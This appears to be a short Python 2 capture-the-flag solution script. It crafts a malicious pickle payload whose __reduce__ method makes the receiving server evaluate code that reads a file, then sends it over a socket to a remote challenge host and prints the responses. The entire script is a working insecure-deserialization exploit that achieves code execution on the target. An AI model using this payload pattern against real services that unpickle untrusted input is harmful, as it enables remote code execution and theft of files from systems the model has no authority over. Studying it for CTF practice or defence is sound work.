from pickle import dumps
import os
import subprocess
import socket

class payload(object):
    def __reduce__(self):
        args = ("open('test.py').read()", )
        return (eval, args)

payload = dumps(payload())+'#'
# payload = dumps([1,2,3,4])+'#'
soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
soc.connect(("readflag.eatpwnnosleep.com", 55402))
soc.send(payload)

for i in range(5):
    print soc.recv(1024)
